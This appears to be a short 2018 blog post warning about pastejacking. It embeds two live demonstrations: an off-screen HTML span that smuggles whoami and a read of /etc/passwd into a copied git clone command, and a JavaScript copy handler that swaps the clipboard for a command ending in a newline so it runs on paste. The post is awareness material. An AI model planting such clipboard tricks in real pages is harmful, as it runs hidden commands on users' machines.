---
layout: post
title: Dangerous Clipboards
date: '2018-04-24 13:11'
---
Have you ever cut/copied/pasted into a terminal window? Here's one of a few reasons why you shouldn't:

note -- another example here: view-source:https://security.love/Pastejacking/

### example 1:
{::nomarkdown}
    <code>
      <!-- Oh noes, you found it! credits go to http://thejh.net/misc/website-terminal-copy-paste-->
      git clone
      <span style="position: absolute; left: -100px; top: -100px">/dev/null; clear; echo -n "Hello ";whoami|tr -d '\n';echo -e '!\nThat was a bad idea. Don'"'"'t copy code from websites you don'"'"'t trust!<br>Here'"'"'s the first line of your /etc/passwd: ';head -n1 /etc/passwd<br>git clone </span>
      git://git.kernel.org/pub/scm/utils/kup/kup.git
    </code>
{:/}


### example 2:
{::nomarkdown}
  <!-- credit to https://security.love/Pastejacking/ -->
 <code>echo "not evil"</code>
        <script>
            document.addEventListener('copy', function(e){
                console.log(e);
                e.clipboardData.setData('text/plain', 'echo "evil"\r\n');
                e.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
            });
        </script>

{:/}